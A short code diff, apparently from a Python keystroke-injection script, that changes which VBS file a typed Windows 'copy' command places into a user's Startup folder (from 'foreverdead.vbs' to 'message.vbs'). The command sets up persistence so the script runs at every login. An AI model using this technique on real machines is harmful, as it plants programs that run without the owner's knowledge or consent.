@@ -10,7 +10,7 @@ keyboard = Controller()
 def delay():
     sleep(1)
 
-move_command = 'copy D:\\MicrosoftVC\\foreverdead\\foreverdeadwindows\\foreverdead.vbs "C:\\Users\\mbyte\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
+move_command = 'copy D:\\MicrosoftVC\\foreverdead\\foreverdeadwindows\\message.vbs "C:\\Users\\mbyte\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
 
 def move():
     write(move_command)
